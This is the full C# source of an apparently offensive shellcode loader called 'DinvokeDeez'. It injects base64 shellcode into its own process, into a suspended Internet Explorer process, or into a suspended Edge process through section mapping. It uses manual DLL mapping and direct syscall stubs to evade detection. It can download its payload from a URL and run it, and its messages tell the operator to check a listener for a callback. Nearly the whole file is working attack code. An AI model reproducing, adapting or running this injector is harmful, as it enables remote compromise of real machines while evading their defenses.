using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.IO;
using System.Collections.Generic;
using System.Diagnostics;
using System.Threading;
using System.Net;
namespace Dinvoke
{


    class Program
    {
        #region functions
        public static IntPtr EnumDisplayMonitors(Data.PE.PE_MANUAL_MAP user32Details, IntPtr hMonitor, IntPtr hdcMonitor, IntPtr lprcMonitor, IntPtr dwData)
        {
            object[] funcargs = { hMonitor, hdcMonitor, lprcMonitor, dwData };
            IntPtr retVal = (IntPtr)DynamicInvoke.Generic.CallMappedDLLModuleExport(user32Details.PEINFO, user32Details.ModuleBase, "EnumDisplayMonitors", typeof(Delegates.EnumDisplayMonitors), ref funcargs, false);
            return retVal;
        }

        public static IntPtr VirtualAlloc(Data.PE.PE_MANUAL_MAP kernel32Details, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect)
        {
            object[] funcargs =
            {
                lpAddress, dwSize, flAllocationType, flProtect
            };
            IntPtr retValue = (IntPtr)DynamicInvoke.Generic.CallMappedDLLModuleExport(kernel32Details.PEINFO, kernel32Details.ModuleBase, "VirtualAlloc", typeof(Delegates.VirtualAlloc), funcargs);
            return retValue;

        }
        public static Boolean CreateProcessA(Data.PE.PE_MANUAL_MAP kernel32Details, string lpApplicationName, string lpCommandLine, ref Structs.SECURITY_ATTRIBUTES lpProcessAttributes, ref Structs.SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, Structs.ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref Structs.STARTUPINFO lpStartupInfo, out Structs.PROCESS_INFORMATION lpProcessInformation)
        {
            lpProcessInformation = new Structs.PROCESS_INFORMATION();
            object[] funcargs =
            {
                lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation
            };
            
            bool retValue = (bool)DynamicInvoke.Generic.CallMappedDLLModuleExport(kernel32Details.PEINFO, kernel32Details.ModuleBase, "CreateProcessA", typeof(Delegates.CreateProcess), ref funcargs);
            lpProcessInformation = (Structs.PROCESS_INFORMATION)funcargs[9];
            return retValue;
        }

        public static IntPtr CreateRemoteThread(Data.PE.PE_MANUAL_MAP kernel32Details, IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId)
        {
            lpThreadId = IntPtr.Zero;
            object[] funcargs =
            {
                hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId
            };
       
            IntPtr retValue = (IntPtr)DynamicInvoke.Generic.CallMappedDLLModuleExport(kernel32Details.PEINFO, kernel32Details.ModuleBase, "CreateRemoteThread", typeof(Delegates.CreateRemoteThread), ref funcargs);
            lpThreadId = (IntPtr)funcargs[6];
            return retValue;
        }
        #endregion
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr GetCurrentProcess();
        static void Main(string[] args)
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0); //aparently this thing helps with avoiding detections lol
            if (mem == null)
            {
                return;
            }
            Dictionary<string, string>  parsedArgs = ParseArgs(args);

            if (parsedArgs.ContainsKey("/h"))
            {
                Help();
                return;
            }
            if (!parsedArgs.ContainsKey("/m"))
            {
                //Help();
                byte[] buf = PrepareBytes();
                Mapping(buf);
            }
            else if (parsedArgs["/m"] == "1" && parsedArgs.ContainsKey("/f"))
            {
                byte[] buf = PrepareBytes(parsedArgs["/f"]);
                Local(buf);
            }
            else if (parsedArgs["/m"] == "1" && !parsedArgs.ContainsKey("/f"))
            {
                byte[] buf = PrepareBytes();
                Local(buf);
            }
            else if (parsedArgs["/m"] == "2" && parsedArgs.ContainsKey("/f"))
            {
                byte[] buf = PrepareBytes(parsedArgs["/f"]);
                Console.WriteLine("[+] We sacrificing Internet Explorer to the blood gods.");
                Sacrificial(buf);
            }
            else if (parsedArgs["/m"] == "2" && !parsedArgs.ContainsKey("/f"))
            {
                byte[] buf = PrepareBytes();
                Console.WriteLine("[+] We sacrificing Internet Explorer to the blood gods.");
                Sacrificial(buf);
            }
            else if (parsedArgs["/m"] == "3" && parsedArgs.ContainsKey("/f"))
            {
                byte[] buf = PrepareBytes(parsedArgs["/f"]);
                Console.WriteLine("[+] Mapping into Edge!");
                Mapping(buf);
            }
            else if (parsedArgs["/m"] == "3" && !parsedArgs.ContainsKey("/f"))
            {
                byte[] buf = PrepareBytes();
                Console.WriteLine("[+] Mapping into Edge!");
                Mapping(buf);
            }
            else 
            {
                Console.WriteLine("[*] Invalid mode");
            }

        }
        static void Help()
        {
            string help = @"
[-] Usage: DinvokeDeez.exe
    Mandatory Keys
    /m => Specifies the injection type. 1 = Local Process Injection, 2 = Remote Process Injection, 3 = Injection via NtCreateSection + NtMapViewOfSection (default)
          Mapping will use edge, remote process injection uses internet explorer ¯\_(ツ)_/¯

    Optional Keys
    /f => Specifies a path to alternative base64 encoded shellcode to inject with. Can be a url too.
    
    example: DinvokeDeez.exe /m:1 /f:D:\Downloads\donut_v0.9.3\test.bin
";
            Console.WriteLine(help);
        }
        static byte[] PrepareBytes()
        {
            var assembly = Assembly.GetExecutingAssembly();
            string stuff = "";
            using (Stream stream = assembly.GetManifestResourceStream("DinvokeWinCallback.loader.b64"))
            using (StreamReader reader = new StreamReader(stream))
            {
                string readerResult = reader.ReadToEnd();
                stuff = readerResult;
            }
            byte[] buf = Convert.FromBase64String(stuff);
            Console.WriteLine("[+] Prepping " + buf.Length + " bytes.");
            return buf;
        }
        static byte[] PrepareBytes(string filepath)
        {
            byte[] buf;
            if (filepath.Substring(0, 7).Equals("http://") || filepath.Substring(0, 8) == "https://")
            {
                try
                {
                    WebClient wc = new WebClient();
                    string base64String = wc.DownloadString(filepath);
                    try
                    {
                        buf = Convert.FromBase64String(base64String);
                        Console.WriteLine("[+] " + buf.Length + " bytes downloaded!");
                        return buf;
                    }
                    catch
                    {
                        Console.WriteLine("[!] URL does not host a base64 encoded payload");
                        Environment.Exit(1);
                    }
                }
                catch
                {
                    Console.WriteLine("[!] URL not accessible!");
                    Environment.Exit(1);
                }
            }
            else if (File.Exists(filepath))
            {
                buf = Convert.FromBase64String(File.ReadAllText(filepath));
                return buf;
            }
            throw new Exception("File does not exist");


        }

        public static Dictionary<string, string> ParseArgs(string[] args)
        {
            var arguments = new Dictionary<string, string>();
            foreach (var argument in args)
            {
                var idx = argument.IndexOf(':');
                if (idx > 0)
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                else
                    arguments[argument] = string.Empty;
            }
            return arguments;
        }

        public static void Local(byte[] buf)
        {
            Console.WriteLine("[+] Mapping kernel32 to process...");
            Data.PE.PE_MANUAL_MAP kernel32Details = ManualMap.Map.MapModuleToMemory("C:\\Windows\\system32\\kernel32.dll");
            IntPtr handle = VirtualAlloc(kernel32Details, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
            Console.WriteLine("[+] Allocated " + buf.Length + " bytes of memory.");

            Marshal.Copy(buf, 0, handle, buf.Length);
            Console.WriteLine("[+] Shellcode copied and pasted!");

            Console.WriteLine("[+] Mapping user32.dll into process...");
            Data.PE.PE_MANUAL_MAP user32Details = ManualMap.Map.MapModuleToMemory("C:\\Windows\\system32\\user32.dll");
            Console.WriteLine("[+] Running EnumDisplayMonitors, check listener.");
            EnumDisplayMonitors(user32Details, IntPtr.Zero, IntPtr.Zero, handle, IntPtr.Zero);
            return;
        }

        public static void Sacrificial(byte[] buf) //sacrificial internet explorer moment
        {
            Structs.STARTUPINFO si = new Structs.STARTUPINFO();
            Structs.PROCESS_INFORMATION pi = new Structs.PROCESS_INFORMATION();
            Structs.SECURITY_ATTRIBUTES lpa = new Structs.SECURITY_ATTRIBUTES();
            Structs.SECURITY_ATTRIBUTES lta = new Structs.SECURITY_ATTRIBUTES();
            Data.PE.PE_MANUAL_MAP kernel32Details = ManualMap.Map.MapModuleToMemory("C:\\Windows\\system32\\kernel32.dll");

            CreateProcessA(kernel32Details, null, "C:\\Program Files\\Internet explorer\\iexplore.exe", ref lpa, ref lta, false, Structs.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi); //suspended makes the process hidden from ui + seems to be more stable
            IntPtr handle = pi.hProcess;
            Console.WriteLine("[+] Process Created!");

            IntPtr baseaddr = IntPtr.Zero;
            IntPtr regionSizePointer = (IntPtr)buf.Length;

            IntPtr ntAllocateVirtualMemoryStub = ManualMap.Map.GetSyscallStub("NtAllocateVirtualMemory");
            Delegates.NtAllocateVirtualMemory ntOpenProcess = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntAllocateVirtualMemoryStub, typeof(Delegates.NtAllocateVirtualMemory));
            ntOpenProcess(handle, ref baseaddr, IntPtr.Zero, ref regionSizePointer, 0x3000, 0x40); //rwx on memory page
            //DynamicInvoke.Native.NtAllocateVirtualMemory(handle, ref baseaddr, IntPtr.Zero, ref regionSizePointer, 0x3000, 0x40); //rwx on memory page
            Console.WriteLine("[+] " + regionSizePointer + " bytes allocated!");

            var unmanagedBuffer = Marshal.AllocHGlobal(buf.Length);
            Marshal.Copy(buf, 0, unmanagedBuffer, buf.Length);
            Console.WriteLine("[+] " + buf.Length + " bytes copied!");

            UInt32 bytesWritten = 0;
            IntPtr ntWriteVirtualMemoryStub = ManualMap.Map.GetSyscallStub("NtWriteVirtualMemory");
            Delegates.NtWriteVirtualMemory ntWriteVirtualMemory = (Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(ntWriteVirtualMemoryStub, typeof(Delegates.NtWriteVirtualMemory));
            ntWriteVirtualMemory(handle, baseaddr, unmanagedBuffer, (uint)buf.Length, ref bytesWritten);
            //DynamicInvoke.Native.NtWriteVirtualMemory(handle, baseaddr, unmanagedBuffer, (uint)buf.Length);
            Console.WriteLine("[+] " + buf.Length + " bytes pasted!");

            IntPtr hThread = IntPtr.Zero;
            IntPtr ntCreateThreadExStub = ManualMap.Map.GetSyscallStub("NtCreateThreadEx");
            Delegates.NtCreateThreadEx ntCreateThreadEx = (Delegates.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(ntCreateThreadExStub, typeof(Delegates.NtCreateThreadEx));
            ntCreateThreadEx(ref hThread, (uint)Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, handle, baseaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            //DynamicInvoke.Native.NtCreateThreadEx(ref hThread, Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, handle, baseaddr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            Console.WriteLine("[*] Check for callback.");
            return;
        }

        public static void Mapping(byte[] buf)
        {
            Structs.STARTUPINFO si = new Structs.STARTUPINFO();
            Structs.PROCESS_INFORMATION pi = new Structs.PROCESS_INFORMATION();
            Structs.SECURITY_ATTRIBUTES lpa = new Structs.SECURITY_ATTRIBUTES();
            Structs.SECURITY_ATTRIBUTES lta = new Structs.SECURITY_ATTRIBUTES();

            Data.PE.PE_MANUAL_MAP kernel32Details = ManualMap.Map.MapModuleToMemory("C:\\Windows\\system32\\kernel32.dll");
            bool succ = CreateProcessA(kernel32Details, null, @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", ref lpa, ref lta, false, Structs.ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
            if (succ)
            {
                Console.WriteLine("[+] Process Created");
            }


            IntPtr sectionHandle = IntPtr.Zero;
            IntPtr hlocalBaseAddress = IntPtr.Zero;
            IntPtr hRemoteBaseAddress = IntPtr.Zero;
            IntPtr lpThreadId = IntPtr.Zero;
            ulong maxSize = (uint)buf.Length;
            uint SECTION_ALL_ACCESS = 0x0F001F;
            uint PAGE_EXECUTE_READWRITE = 0x40;
            uint SEC_COMMIT = 0x8000000;
            uint PAGE_READWRITE = 0x04;
            uint PAGE_EXECUTE_READ = 0x20;

            IntPtr ntCreateSectionStub = ManualMap.Map.GetSyscallStub("NtCreateSection");
            DynamicInvoke.Native.Delegates.NtCreateSection ntCreateSection = (DynamicInvoke.Native.Delegates.NtCreateSection)Marshal.GetDelegateForFunctionPointer(ntCreateSectionStub, typeof(DynamicInvoke.Native.Delegates.NtCreateSection));
            ntCreateSection(ref sectionHandle, SECTION_ALL_ACCESS, IntPtr.Zero, ref maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
            //DynamicInvoke.Native.NtCreateSection(ref sectionHandle, SECTION_ALL_ACCESS, IntPtr.Zero, ref maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero); //create section
            Console.WriteLine("[+] Local Section crated.");

            IntPtr ntMapViewOfSectionStub = ManualMap.Map.GetSyscallStub("NtMapViewOfSection");
            DynamicInvoke.Native.Delegates.NtMapViewOfSection ntMapViewOfSection = (DynamicInvoke.Native.Delegates.NtMapViewOfSection)Marshal.GetDelegateForFunctionPointer(ntMapViewOfSectionStub, typeof(DynamicInvoke.Native.Delegates.NtMapViewOfSection));
            ntMapViewOfSection(sectionHandle, Process.GetCurrentProcess().Handle, out hlocalBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out maxSize, 2, 0, PAGE_READWRITE);
            //DynamicInvoke.Native.NtMapViewOfSection(sectionHandle, Process.GetCurrentProcess().Handle, ref hlocalBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref maxSize, 2, 0, PAGE_READWRITE); //locally mapped
            Console.WriteLine("[+] Local mapping made.");

            ntMapViewOfSection(sectionHandle, pi.hProcess, out hRemoteBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out maxSize, 2, 0, PAGE_EXECUTE_READ);
            //DynamicInvoke.Native.NtMapViewOfSection(sectionHandle, pi.hProcess, ref hRemoteBaseAddress, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref maxSize, 2, 0, PAGE_EXECUTE_READ); //remote map
            Console.WriteLine("[+] Remote mapping made.");

            Marshal.Copy(buf, 0, hlocalBaseAddress, buf.Length);
            Console.WriteLine("[+] " + buf.Length + " bytes copied into local map!");

            CreateRemoteThread(kernel32Details, pi.hProcess, IntPtr.Zero, 0, hRemoteBaseAddress, IntPtr.Zero, 0, out lpThreadId);

            Console.WriteLine("[+] Thread created, check listener!");
        }
    }
}
